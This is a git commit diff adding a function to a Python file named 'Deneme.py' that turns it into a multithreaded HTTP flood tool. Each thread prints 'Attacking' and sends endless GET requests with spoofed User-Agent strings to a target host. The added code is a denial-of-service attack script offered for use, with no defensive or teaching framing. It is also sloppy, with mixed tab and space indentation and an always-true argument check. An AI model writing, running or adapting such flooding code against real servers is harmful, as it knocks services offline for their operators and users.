6d0a40959e9913631b74a6a952000d3b55ca2db2
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-09-29 17:53:29 +0300

    Update Deneme.py

--- Deneme.py
+++ Deneme.py
@@ -6,3 +6,18 @@ import threading
 user_agent = [
   "Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d Build/OSR18H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
        ]
+
+def run():
+	if len(sys.argv)>=1:
+		url="http://"+host
+		print "Attacking",host 
+        while True:
+			headers={'User-Agent': random.choice(user_agent)}
+			r = requests.get(url,headers=headers)
+			
+	else:
+		print "It only work on HTTP server!!!"
+
+for i in range(thread_num):
+    th = threading.Thread(target = run)
+    th.start()
